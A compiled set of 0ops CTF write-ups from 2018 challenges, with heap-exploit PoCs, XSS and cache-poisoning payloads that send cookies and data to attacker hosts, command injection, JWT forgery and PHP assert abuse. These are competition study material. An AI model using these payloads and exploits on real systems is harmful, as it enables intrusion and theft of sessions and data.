<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-0ops
description: CTF writeups and security challenges by 0ops.
---

# Writeups by 0ops

Source repository: `/repos/0ops`

## Repository Index

- ctfs/README.md
- ctfs/todo.md
- ctfs/2022/darksol/README.md
- ctfs/2022/darksol/source/darksols/spl-token/program-id.md
- ctfs/2018/wctf-2018/crypto/rsa/README.md
- ctfs/2018/starctf-2018/re/BabyDroid/README.md
- ctfs/2018/starctf-2018/re/wasm/README.md
- ctfs/2018/n1ctf-2018/re/baby_neural_network/README.md
- ctfs/2018/n1ctf-2018/re/lfi/README.md
- ctfs/2018/n1ctf-2018/crypto/baby_N1ES/README.md
- ctfs/2018/n1ctf-2018/crypto/easy_fs/README.md
- ctfs/2018/meepwn-quals-2018/web/grandline/README.md
- ctfs/2018/meepwn-quals-2018/crypto/bitbitbit/README.md
- ctfs/2018/meepwn-quals-2018/crypto/old_school/README.md
- ctfs/2018/meepwn-quals-2018/crypto/still_old_school/README.md
- ctfs/2018/hitcon-2018/pwn/abyss/README.md
- ctfs/2018/hctf-quals-2018/blockchain/ez2win/exp.md
- ctfs/2018/hacklu-2018/web/BabyPHP/README.md
- ctfs/2018/google-2018/web/gcalc/README.md
- ctfs/2018/dragonctf-2018/web/Nodepad/README.md
- ctfs/2018/csaw-quals-2018/web/hackermovie/README.md
- ctfs/2018/csaw-quals-2018/web/ldab/README.md
- ctfs/2018/csaw-quals-2018/web/novuln/README.md
- ctfs/2018/csaw-quals-2018/web/sso/README.md
- ctfs/2018/codegate-quals-2018/web/SimpleCMS/index.md
- ctfs/2018/0ctf-final-2018/pwn/zeroftp/README.md
- ctfs/2017/blizzard-2017/strng/README.md

## Writeup Content


### File: ctfs/2017/blizzard-2017/strng/README.md

[Chall](https://github.com/rcvalle/blizzardctf2017/releases/download/v0.0.1/strng.tar.gz)



### File: ctfs/2018/0ctf-final-2018/pwn/zeroftp/README.md

# VTP1 & VTP2 Writeup

VTP means vulnerable transfer protocol. It contains a private protocol implementing part of FTP commands and a filesystem designed by ourself. 

VTP1 and VTP2 shares the same binary and the binary is running on Ubuntu 16.04. For VTP1,  you have to get the first flag by reversing the binary and find out the backdoor. For VTP2,  you have to exploit the bug in the binary and then get shell to find the second flag.  

## VTP1

### Protocol Design

The protocol we designed is described as follows. The magic number is `0xdd`,  and data_length is represented in `big-endian`.  After that is `data`.  At the end of payload,  there is a crc32 of `data`.

```
| magic  | data_length(big endian) | data | check_sum |
| ------ | ----------------------  | ---- | --------- |
```

To make the challenge more interesting,  we define 5 types of `variable` used in the protocol `data`. `Variable` starts with a byte called `info`. `Info` will indicates the type of `variable` and other variable type specified information. 

Detailed Design of `variable` can be described as follows.

```
 bits[0:3] - types

 types:
  1. bool
      bits[3] - value 0 or 1
  2. string
      null terminated
  3. raw
      bits[3] - short raw (0) or long raw (1)
      if short raw
          bits[4:8] - length
      elif long raw 
          bits[4:8] - length of length
  4. int
      bits[4] - endian (0 for little-endian and 1 for big-endian)
      bits[5:8] - length
  5. list
      bits[3:8] - length of length

``` 

For example, 0x9(0b1001) means the data type is boolean and the value is True. Further,  for `raw` if it is a short raw(bits[3]==0),  then bits[4:8] represented the length of `raw` data.  If not, then bits[4:8] represented the length of `raw` data length.

After `variable` is known, we should know how to use `variable` to send a VTP command.

Firstly there are 12 types of command implemented like FTP showed as follows.

```
enum zeroftp_cmd_type {
    ZEROFTP_LOGIN = 1,
    ZEROFTP_LS,
    ZEROFTP_CD,
    ZEROFTP_MKDIR,
    ZEROFTP_RMDIR,
    ZEROFTP_RDFILE,
    ZEROFTP_WRFILE,
    ZEROFTP_RMFILE,
    ZEROFTP_FILEINFO,
    ZEROFTP_SETFILEINFO,
    ZEROFTP_BACKDOOR,
    ZEROFTP_QUIT,
};
```

For example, if you want to send a ZEROFTP_LOGIN command,  `data` should starts with a `command_type` which is represented by `int variable` and its value is `1`. Following the `command_type` is `username(string)` and `password(raw)`.

You can check The following whole VTP commands specification.

```
LOGIN 		: command_type(int) + username(string) + password(raw)
LS 			: command_type(int) + filename(string)
CD 			: command_type(int) + dirname(string)
MKDIR 		: command_type(int) + dirname(string)
RMDIR 		: command_type(int) + dirname(string)
RDFILE 		: command_type(int) + filename(string)
WRFILE 		: command_type(int) + filename(string) + file_content(raw)
RMFILE 		: command_type(int) + filename(string)
FILEINFO 	: command_type(int) + filename(string) + fileinfo_type(int, optional)
SETFILEINFO : command_type(int) + filename(string) + fileinfo_type(int) + fileinfo(string or int)
BACKDOOR 	: command_type(int) + filename(string)
```

## Backdoor

Now to get the flag of VTP1,  you should use `BACKDOOR` command. `BACKDOOR` will read the file which is specified by the filename in the VTP command, in the server's real filesystem  and write the content to the self-made fs. But as you know, flag is stored as `here_is_your_flag/flag`, so you have to use `MKDIR` to make a directory called `here_is_your_flag` in the self-made fs before using `BACKDOOR`. Afterwards use `RDFILE` and get your first flag of VTP!

### Exploit

Here is PoC for VTP1

```
zeroftp_login('admin', 'admin')
zeroftp_mkdir('here_is_your_flag')
zeroftp_backdoor("here_is_your_flag/flag")
flag = zeroftp_rdfile("here_is_your_flag/flag")
log.info('get the flag:{}'.format(flag))
```

## VTP2

For challenge 2, you're preferred to get shell to get the second flag. There are two intended bugs lies on the binary.

### Infoleak (bug1)

The first one is, when unpacking `variable`, VTP won't check whether the length of `variable` will exceed the `data`, which means when you send a `variable`, you can set the length in `info` longer than the real following data length.

For example, we can send a `raw` as follows.

```
b4 00 00 10 00 00 41 41 41 41
```

But how to exploit the bug? Just use `WRFILE`, and forge the file content(`raw`) as above. Then VTP will write the filecontent containing `AAAA` and other data lies on heap behind `data`. Then we will get a infoleak after using `RDFILE`.

Here is the PoC for infoleak. Heap address and libc address can be leaked.

```
def leak():
    zeroftp_login('admin', 'admin')

    zeroftp_wrfile('X'*0x100, 'x'*0x100)
    zeroftp_rmfile('X'*0x100)

    payload  = zero_pack_int(0x7, endian='big')
    payload += zero_pack_string('Y'*8)
    # raw
    info = 0
    info = BITS_SET_VAL(info, 0, 3, 3)
    len_len = (len(bin(0xf0)[2:])-1)/8+1
    raw_len= pack(0xf0, 8*len_len, endian='little')
    info = BITS_SET_VAL(info, 3, 4, 1)
    info = BITS_SET_VAL(info, 4, 8, len_len)
    payload += chr(info)
    payload += raw_len
    payload += 'bbbbbbbb'
    zero_send(payload)
    ret = zero_recv()

    ret = zeroftp_rdfile('Y'*8)
    libc.address = u64(ret[0x2a:][:8]) - 0x3c4b98
    heap = u64(ret[0x2a+8:][:8]) - 0x470
    log.info(hex(libc.address))
    log.info(hex(heap))
    zeroftp_rmfile('Y'*0x8)
    return libc.address, heap
```

### buffer overflow (bug2)

The other intended one is that a buffer overrun will be invoked if you opened enough files and don't close them.

Before explaining details about this bug, we should have a little knowledge of some important structures of the self-made filesystem(The structures defined in our self-made filesystem are similar to those of popular filesystems). 

Those structures are listed as follows. For each file,  VTP use `struct fnode_t` to record its attributes and use `zerofs_state->io_files` to record all of the opened file descriptor.

```
typedef struct fnode_t {
    union {
        struct fnode_t *child;
        long int inumber;
    } info;
    perm_t perm;
    file_t type;
    time_t createTime;
    time_t modifyTime;
    long int userId;
    struct fnode_t *parent;
    struct fnode_t *brother;
    char *name;
} fnode_t;

typedef struct IOFile {
    long int cur;
    fnode_t *fnode;
    int flags;
} IOFile;

typedef struct {
    long int userId;
    char *username;
    zerofs_disk *disk;
    fnode_t *root;
    fnode_t *pwd;
    IOFile *io_files[FD_MAX];
} zerofs_state;
```

Now here is the pseudocode of the buggy function. 

```
__int64 __fastcall insert_IOFile_4056D5(__int64 a1)
{
  int fd; // [rsp+14h] [rbp-4h]

  for ( fd = 0; state->io_files[fd]); ++fd )
    ;
  state->io_files[fd] = io_file;
  return fd;
}
```

Here fd is used as index of `state->io_files` to store `IOFILE` structure pointers. So if we create enough files and dont't close them, state->io_files buffer will be overflowed and `IOFILE` structure pointer will be written to the next chunks on the heap(state->io_files lies on heap).

Before exploiting the bug, we still need a command which won't close fd. Yeah, It's `RDFILE`.

Now by using `RDFILE` continuously, io_file will be written to the area that was originally zero.

### Exploit

Since the field `brother` of `fnode_t` may be zero, we can try to overwrite it with `IOFILE` structure pointer.

After opened 0x2e files, the next opening file operation will lead to the first file's fnode's `brother` field being written as io_file pointer, which means we are able to forge a fnode now. Since the size of `IOFILE` is 0x20 and the size of `fnode_t` is 0x50, we can forge the first 0x20 bytes of fnode by controling `IOFILE` and forge the next 0x30 bytes by controling the following chunk's content. Luckily, the following 0x30 bytes is the head of "root fnode". 

But how to get an arbitrary writing? My idea is to control `name` field of the forged fnode and then rename the file relating to the forged fnode. It's easy to control field `name` by using `setfileinfo('/', 5, 0xdeadbeefdeadbeef)` where `5` means modifytime, one arttribute of the file. 

Now we have realized arbitrary write and have the knowledge of the libc address and heap address. Just prepare a `_IO_jump_t` filled with `magic system` on heap and overwrite `vtable` field of stdout to point to the forged vtable to get shell.

PoC is showed as follows. 

```
for i in xrange(0x2e):
    zeroftp_wrfile('%08d' % i, 'x'*0x10)
for i in xrange(0x1e):
    zeroftp_rdfile('%08d' % (i+0x10))

zeroftp_wrfile('%08d' % 0x2e, p64(libc.address+0x4526a)*32)
zeroftp_rdfile('%08d' % 0x2e)

zeroftp_setfileinfo('/', 2 , heap + 0x110)
zeroftp_setfileinfo('/', 4 , 0)
zeroftp_setfileinfo('/', 5 , libc.address+0x3c56f8)
zeroftp_setfileinfo(p64(libc.address+0x3c36e0)[:6], 0, p64(heap+0x1b90))

```


[exp.py](https://github.com/ZhangZhuoSJTU/MyCTF/blob/master/2018/0CTF_Final/zeroftp/exp.py) 
[source code](https://github.com/ZhangZhuoSJTU/MyCTF/tree/master/2018/0CTF_Final/zeroftp)



### File: ctfs/2018/csaw-quals-2018/web/hackermovie/README.md

After access this site, find a strange header: 

```
HTTP/1.1 200 OK
Server: gunicorn/19.9.0
Date: Mon, 17 Sep 2018 12:39:10 GMT
Content-Length: 523
Content-Type: application/octet-stream
Last-Modified: Fri, 14 Sep 2018 03:54:50 GMT
Cache-Control: public, max-age=43200
Expires: Tue, 18 Sep 2018 00:39:10 GMT
ETag: "1536897290.0-523-1486424030"
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: HEAD, OPTIONS, GET
Access-Control-Max-Age: 21600
Access-Control-Allow-Headers: X-Forwarded-Host
X-Varnish: 147513532
Age: 0
Via: 1.1 varnish-v4
Accept-Ranges: bytes
Connection: keep-alive
Proxy-Connection: keep-alive
```

Guess it may be a Web Cache Poison attack, and we can also find the following content in response:

```json
{
    "admin": false,
    "movies": [
        ...
        {
            "admin_only": true,
            "length": "22 Hours, 17 Minutes",
            "name": "[REDACTED]",
            "year": 2018
        }
    ]
}
```

So it's clear that we can get flag by poison the cache and then report it to admin. 

To get the movie list, we can add ``<img src=x onerror="fetch('http://123.206.65.192/'+'{{#movies}}{{ name }}{{/movies}}')">`` to the main.mst and put it on our server, then poison cache with the following script:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests

host = 'ourip' 

while True:
    r = requests.get("http://d05dfb9b052433fb53dbc435cc82838b069d9e2e.hm.vulnerable.services/cdn/app.js", headers={'X-Forwarded-Host': host})
    if host in r.content:
        print 'success'
        break
``` 

One thing we need be careful is that we should add cors headers to allow ``hm.vulnerable.services`` fetch our site.

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: HEAD, OPTIONS, GET
Access-Control-Max-Age: 21600
Access-Control-Allow-Headers: X-Forwarded-Host
```

After success, just report it, and we will receive the flag on our server.

```
GET /WarGamesKung%20FurySneakersSwordfishThe%20Karate%20KidGhost%20in%20the%20ShellSerial%20Experiments%20LainThe%20MatrixBlade%20RunnerBlade%20Runner%202049HackersTRONTron:%20LegacyMinority%20ReporteXistenZflag%7BI_h0pe_you_w4tch3d_a11_th3_m0v1es%7D
```



### File: ctfs/2018/csaw-quals-2018/web/ldab/README.md

Fuzz for a while, find if search ``*`` and ``)`` would return something different, consider title ``ldab``, guess it's a LDAP injection.

try ``objectclass``, but do not find anything useful, seems flag is in this table, but there add some condition to make it invisible.

So after we closed condition by ``*)))%00``, we will see the flag.
flag{ld4p_inj3ction_i5_a_th1ng}



### File: ctfs/2018/csaw-quals-2018/web/novuln/README.md

> Especially thanks to [rebirth](https://github.com/rebirthwyw) who help me a lot when finishing this write-up.

Access site ``http://no.vulnerable.services/``, we can found two useful things here, first, it's CSP:

```
Content-Security-Policy: default-src 'none'; script-src *.no.vulnerable.services https://www.google.com/ https://www.gstatic.com/; style-src *.no.vulnerable.services https://fonts.googleapis.com/ 'unsafe-inline'; img-src *.no.vulnerable.services; font-src *.no.vulnerable.services https://fonts.gstatic.com/; frame-src https://www.google.com/
```

And something like a hint in the footer:

```
Served By: d8a50228.ip.no.vulnerable.services
```

After try sometimes, we found that ``d8a50228`` is the hex format of ``216.165.2.40`` and ``hex(ip).ip.no.vulnerable.services`` would return correspond ip. So we can use this feature to bypass the CSP.

Put the following js script on our site.

```javascript
var img = document.createElement("img");
img.src = "http://7bce41c0.ip.no.vulnerable.services/?cookie=" + encodeURI(document.cookie);
document.body.appendChild(img);
```

And submit the following content:

```html
<script type="text/javascript" src="//{hexip}.ip.no.vulnerable.services/main.js"></script>
```

Then we can see the following record on our server.

```
GET /?cookie=PHPSESSID=ri4r4q1ujkd0rh2fefvcvnfkt0
http://admin.no.vulnerable.services/review.php?id=237
```

Use this cookie visit ``http://admin.no.vulnerable.services``, we will see ``admin.no.vulnerable.services/lb.php`` and ``support.no.vulnerable.services`` on this website.

In ``lb.php``, we can found ``216.165.2.41``, but can not access.

If we change host to ``support.no.vulnerable.services``, it would return ``Hacking detected! Denied attempt to proxy to a NVS internal hostname. Your IP has been logged.``.

Seems ``216.165.2.41`` is a proxy, so we could use ``{hexip}.ip.no.vulnerable.service`` again.

Dig ``support.no.vulnerable.services``, know its ip is ``172.16.2.5``, so we can use ``ac100205.ip.no.vulnerable.services`` to access it.

Then we get a page can ping, seems it's a command line injection. After try

```
127.0.0.`ls`
```

get

```
ping: 127.0.0.flag.txt index.php ping.php: Name or service not known 
```

Finally, it's time to get flag:

```
127.0.0.``cat flag.txt``
```

=> 

```
ping: 127.0.0.flag{7672f158167cab32aebc161abe0fbfcaee2868c1}: Name or service not known 
```



### File: ctfs/2018/csaw-quals-2018/web/sso/README.md

After access to the website, we will see:

```html
<h1>Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!</h1>
<a href="/protected">.</a>
<!--
Wish we had an automatic GET route for /authorize... well they'll just have to POST from their own clients I guess
POST /oauth2/token 
POST /oauth2/authorize
--!>
```

Seems we need use oauth to login and access ``/protected``. After try with oauth standard, we will get a token like ``eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNjk3MzkwOSwiZXhwIjoxNTM2OTc0NTA5fQ.qfEHpLa78Cp-jNoJ-2xp8_4qnj9TDeqlKllLWWW3o-Q``.

But with this token, we will get a response like ``Unauthorized``.

Try decode this token:

```json
{
  "type": "user",
  "secret": "ufoundme!",
  "iat": 1536973909,
  "exp": 1536974509
}
```

looks like jwt secret is ``ufoundme!``, so just make a new token which type is ``admin`` and access ``/protected``, we wiil get flag: ``flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}``.

Finally, my payload is here:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import jwt
import time
import json
# https://github.com/LyleMi/Saker
from saker.main import Saker


class Cli(Saker):

    def __init__(self, url):
        super(Cli, self).__init__(url)

    def authorize(self, cid):
        data = {
            "response_type": "code",
            "client_id": cid,
            "redirect_uri": "token",
            "state": "ok"
        }
        self.post("oauth2/authorize", data=data)
        return self.lastr.url

    def token(self, cid, code):
        data = {
            "code": code,
            "grant_type": "authorization_code",
            "client_id": cid,
            "redirect_uri": "token",
            "state": "ok"
        }
        self.post("oauth2/token", data=data)
        return self.lastr.content

    def protected(self, token):
        headers = {
            "Authorization": "Bearer " + token,
        }
        self.get("protected", headers=headers)
        print(self.lastr.content)


if __name__ == '__main__':
    url = "http://web.chal.csaw.io:9000/"  # site url
    c = Cli(url)
    cid = "admin"
    step = sys.argv[1]
    if step == "1":
        code = c.authorize(cid).split("code=")[1].split("&")[0]
        print(code.split(".")[1].decode("base64"))
        token = json.loads(c.token(cid, code))["token"]
        payload = token.split(".")[1]
        payload = payload + '=' * (4 - len(payload) % 4)
        print(payload.decode("base64"))
    elif step == "2":
        key = "ufoundme!"
        payload = {
            "type": "admin",
            "secret": "ufoundme!",
            "iat": int(time.time()),
            "exp": int(time.time()) + 600
        }
        token = jwt.encode(payload, key)
        c.protected(token)
```



### File: ctfs/2018/dragonctf-2018/web/Nodepad/README.md

# Nodepad

This is a typical XSS challenge, after looking at source code, we will know flag can be fetched from ``/admin/flag``.

```javascript
router.get('/flag', (req, res) => {
  res.render('index', {notices: [process.env.FLAG]});
});
```

## RexExp Bypass

Obviously, the vulnerable part in the application is adding notes, but we can not inject ``<>`` here.

```javascript
const regex = /[<>]/;

let errors = [];
if (regex.test(req.body.title)) {
errors.push('Title is invalid');
}

if (regex.test(req.body.content)) {
errors.push('Content is invalid');
}

if (errors.length !== 0) {
return res.render('new', {errors});
}
```

To bypass this regexp, we can use a little trick here:

```javascript
regex.test(['a' : '<']) // true
regex.test({'a' : '<'}) // false
```

So if we post a dict, we can insert any tag we want. There is one thing which we need pay attention is we can not post dict with ``application/x-www-form-urlencoded`` in express, so we can should use ``application/json`` here.

## CSP Bypass

We can inject any tag now, but there has a CSP which we need bypass:

```
default-src 'none';
script-src 'nonce-43fa45e17bdab68f0714216de52b1a08' 'strict-dynamic';
style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css;
img-src 'self';
connect-src 'self';
frame-src https://www.google.com/recaptcha/;
form-action 'self';
```

This part is easy, we could use ``<base>`` tag then admin will request ``/javascripts/notes.js`` from our server.

## Final Part

After writing a script to get flag, I found there is only a request to get ``/javascripts/notes.js``, no flag. Check the request for some time, I found the ``Refer`` is ``http://10.62.20.153:3000``, so we can't get flag by ``http://nodepad.hackable.software:3000``, we need request ``http://10.62.20.153:3000/admin/flag`` here.

Finally, flag is ``DrgnS{Ar3_Y0u_T3mP14t3d?}``.

You can see my [script](https://github.com/0ops/ctfs/blob/master/2018/dragonctf-2018/web/Nodepad/cli.py) and [notes.js](https://github.com/0ops/ctfs/blob/master/2018/dragonctf-2018/web/Nodepad/notes.js) in this repo.



### File: ctfs/2018/google-2018/web/gcalc/README.md

# gCalc

`Author: SYM01`

gCalc is an XSS challenge in Google CTF 2018. The details can be referred to the [Orange's blog](http://blog.orange.tw/2018/06/google-ctf-2018-quals-web-gcalc.html).

Orange's solution is concise and powerful. But I use another way to build the payload, a more complex one.

## How?
Focus on the following regex:
```javascript
/^(?:[\(\)\*\/\+%\-0-9 ]|\bvars\b|[.]\w+)*$/
```
We can use `/`, `+`,  `(`, `)`, any number and any lowercase words leading with `.`. It's enough for us to build the payload.

Examples:

```javascript
// to get "return "
/.return /.source.substr(1)

// to get "C"
/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift()

// to get "String.fromCharCode(48)"
/(0+(1.zthis)).constructor.from.yhar.yode(48)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())
```

We can finally invoke `String.fromCharCode()`.

On the basis of the above, we can build any payloads.


## Exploit
We use the following script to generate the final payload.
```python
#!/usr/bin/env python3
import sys

fromCharCode_tpl = r'/(0+(1.zthis)).constructor.from.yhar.yode({})/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())'

sep = r'+/1+/.source.substr(1)+'

def encode(c:str)->str:
     return fromCharCode_tpl.format(ord(c))

payload = sep.join(map(encode, sys.argv[1]))

print(r'/0/.constructor.constructor(/0/.constructor.constructor(/.return /.source.substr(1)+{})())()'.format(payload))
```

By using the upper script, we can generate the payload for `alert(/0ops/)`:
```javascript
/0/.constructor.constructor(/0/.constructor.constructor(/.return /.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(97)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(108)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(101)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(114)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(116)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(40)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(47)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(48)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(111)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(112)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(115)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(47)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(41)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift()))())()
```
It's quite annoying. XD.


### File: ctfs/2018/hacklu-2018/web/BabyPHP/README.md

After access this site, we will see [source code](https://github.com/0ops/ctfs/blob/master/2018/hacklu-2018/web/BabyPHP/index.php) here, we can know this is a typical PHP trick challenge.

## Part One: PHP Wrapper

```php
@$msg = $_GET['msg'];
if(@file_get_contents($msg)!=="Hello Challenge!"){
    die('Wow so rude!!!!1');
}
```

At first, we need to find an input which satisfies the above conditions. In here, we need PHP wrapper.

PHP can read something like ``php://input`` / ``data://text/plain;xxx`` and some other things as file.

For example, ``file_get_contents("data://text/plain,Hell Challenge!")`` will return ``Hello Challenge!`` here, so we can solve this part by use ``data://text/plain,Hell Challenge!`` as payload.

## Part Two: Weak Type

```php
@$k1=$_GET['key1'];
@$k2=$_GET['key2'];

$cc = 1337;$bb = 42;

if(intval($k1) !== $cc || $k1 === $cc){
    die("lol no\n");
}
```

After that, we need to find a k1 which ``intval($k1) == $cc`` and ``$k1 !== $cc``, this is easy, when we post some thing, PHP will use it as string, so ``1337`` is enough here.

## Part Three: UTF8

```php
if(strlen($k2) == $bb){
    if(preg_match('/^\d+＄/', $k2) && !is_numeric($k2)){
        if($k2 == $cc){
            @$cc = $_GET['cc'];
        }
    }
}
```

At first glance, we need to find a k2 which only have digit here, but is not number by PHP's ``is_numeric`` function. But this challenge use ``＄`` rather than ``$``, so ``000000000000000000000000000000000001337＄`` would be cool.

## Part Four: Variable Coverage

```php
if(substr($cc, $bb) === sha1($cc)){
    foreach ($_GET as $lel => $hack){
        $$lel = $hack;
    }
}
```

In PHP, you can use ``$$`` to get a dynamic variable. For example:

```php
$b = true;
$a = 'b';
$$a = false;
var_dump($b); // false here
```

Therefore we can change some variable here. However, we need bypass this check ``substr($cc, $bb) === sha1($cc)`` first. We need another PHP trick here. When we post an array, ``substr`` / ``sha1`` will return ``NULL`` but not throw error here, so send ``cc[]=1`` will bypass this check.

## Part Five: Evil Assert

After satisfying the above conditions, we found that the code to print the flag was commented. But it doesn't matter, we have ``assert`` here! Assert will execute the string passed in, and we can control all variable with variable coverage part.

Finally, our payload is ``https://arcade.fluxfingers.net:1819/?bb=print_r%28%24flag%29%3B%2F%2F&key2=000000000000000000000000000000000001337%EF%BC%84&key1=1337&k1=2&cc%5B%5D=&msg=data%3A%2F%2Ftext%2Fplain%2CHello+Challenge%21``.




### File: ctfs/2018/hitcon-2018/pwn/abyss/README.md

* ld.so.2 and libc.so.6 are system libs from Ubuntu 18.04
* ./hypervisor.elf kernel.bin ld.so.2 ./user.elf



### File: ctfs/2018/meepwn-quals-2018/crypto/bitbitbit/README.md

# Writeup

1. list all possible value of `(p - q)&(2^t2-1)`, namely `gamma-2000 ~ gamma+2000`
2. solve the equation `x * (x + g) == n mod (2^t2)` and get the low bits of p and q
3. use Known Low bits of Factor Attack to factor n
4. decrypt flag with private key




### File: ctfs/2018/meepwn-quals-2018/crypto/old_school/README.md

# Writeup

* part 1 —— use yafu, `fermat(n, 10000000)`
* part 2 —— hex(n), find that n = (a\*(2^1000)+b) * (c\*(2^1000)+d)
* part 3 —— find a valid `tmp` and deduce the values of `randint`

```sage
nn = 139713689065649193238602077859960857468098993135221000039102730899547298927683962573562384690733560045229965690142223836971463635696618075169874035306125645096696682021038045841133380609849851790395591047968701652975799368468556274243238594974251982826875184190103880810901174411829635180158201629467635591810569775155092318675639049754541256014635438864801255760305914815607547032463796789980267388517787537827413511219215383011915710116907720461035152786018808394261912036183662986050428253151429051345333273081222126466016921456969903177087878715836995228953335073770833282613911892360743789453583070756075529298371748549
tmp = isqrt(nn//1337//7331) - (2^(512+1))//7331
res = nn - tmp*tmp*1337*7331
# print p-1337*tmp
# print q-7331*tmp
a = res % tmp
b = res // tmp
print 'mul', a
print 'add', b, int(b).bit_length()
var('x, y')
gg = solve([x*y==a, 7331*x+1337*y==b], x, y)
print gg
```




### File: ctfs/2018/meepwn-quals-2018/crypto/still_old_school/README.md

# Writeup

1. use 156 ivs to get the state of `python Random`
2. reverse the Mersenne-twister algo and get the previous rand ints
3. calculate the value of `random()` in `gen_key`
4. get the value of mask1 and mask2 by mitm
5. get flag




### File: ctfs/2018/meepwn-quals-2018/web/grandline/README.md

# Grandline

`Author: SYM01`

There is a `RPO` problem in the website. When visit [http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/{abc}/](http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/{abc}/), the page will load the script from `http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/{abc}/js/jquery.min.js`.

The only thing we need to to is making that script evil. 
We simply replace the token `{abc}` with the following payload, 
then the evil script works and sends the flag to our server.
```txt
*/window.onload=function()%7Blocation=String.fromCharCode(104,116,116,112,58,47,47,51,53,46,50,48,55,46,52,46,50,51,47)%2Bdocument.querySelectorAll(String.fromCharCode(105,110,112,117,116))[1].value%7D;console.log(/*
```

So the final payload is 
```url
http://localhost/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/window.onload=function()%7Blocation=String.fromCharCode(104,116,116,112,58,47,47,51,53,46,50,48,55,46,52,46,50,51,47)%2Bdocument.querySelectorAll(String.fromCharCode(105,110,112,117,116))[1].value%7D;console.log(/*/
```

-->
`You are on new world, flag: MeePwnCTF{Welcome_to_New_World}`



### File: ctfs/2018/n1ctf-2018/crypto/baby_N1ES/README.md

`x + y - 2 * (x & y)`就是异或，本题的加密方式就是简单的Feistel结构，对着加密写个解密函数即可



### File: ctfs/2018/n1ctf-2018/crypto/easy_fs/README.md

